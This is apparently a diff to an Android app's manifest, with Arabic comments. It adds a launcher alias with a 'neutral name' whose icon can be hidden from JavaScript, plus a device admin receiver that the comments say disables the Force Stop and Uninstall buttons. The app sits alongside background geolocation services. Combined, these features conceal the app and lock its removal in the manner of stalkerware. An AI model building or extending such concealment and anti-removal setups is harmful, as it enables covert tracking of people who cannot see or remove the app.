@@ -54,6 +54,7 @@
             android:value="true" />
 
         <!-- ===== MAIN ACTIVITY ===== -->
+        <!-- ملاحظة: الـ MAIN/LAUNCHER intent-filter انتقل لـ MainActivityAlias عشان نقدر نخفي الأيقونة -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -61,12 +62,41 @@
             android:theme="@style/AppTheme"
             android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
             android:windowSoftInputMode="adjustResize"
-            android:screenOrientation="portrait">
+            android:screenOrientation="portrait" />
+
+        <!-- ===== ACTIVITY ALIAS - الأيقونة الظاهرة في الـ Launcher ===== -->
+        <!-- اسم محايد + يمكن إخفاؤه/إظهاره من JavaScript -->
+        <activity-alias
+            android:name=".MainActivityAlias"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:label="@string/alias_app_name"
+            android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <!-- ===== DEVICE ADMIN RECEIVER ===== -->
+        <!-- يعطّل أزرار Force Stop + Uninstall في إعدادات التطبيق -->
+        <receiver
+            android:name=".WhiteHorseAdminReceiver"
+            android:label="@string/device_admin_label"
+            android:description="@string/device_admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_policies" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+            </intent-filter>
+        </receiver>
 
         <!-- ===== TRANSISTOR BACKGROUND GEOLOCATION SERVICES ===== -->
         <!-- NOTE: Only adding foregroundServiceType to existing services -->
